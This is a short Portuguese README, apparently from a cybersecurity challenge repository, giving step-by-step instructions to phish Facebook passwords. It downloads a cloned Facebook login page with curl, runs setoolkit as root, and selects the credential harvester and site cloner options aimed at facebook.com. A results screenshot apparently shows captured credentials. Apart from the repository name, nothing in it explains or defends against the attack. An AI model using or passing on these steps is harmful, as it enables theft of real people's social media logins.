# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Inicie

- Crie um diretorio de nome tool no home mkdir /home/tool/
- Acesse este diretorio cd /home/tool/
- Baixe o login page do facebook com wget ou curl 
- curl https://raw.githubusercontent.com/percioandrade/cibersecurity-desafio-phishing/refs/heads/master/facebook_login_template.html > index.html
- Acesse o setoolkit e siga a sequencia de imagens abaixo:

### Configurando o Phishing no Kali Linux
- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados
![passwd](https://github.com/user-attachments/assets/50facc98-4cce-4446-a218-446d2593eea3)


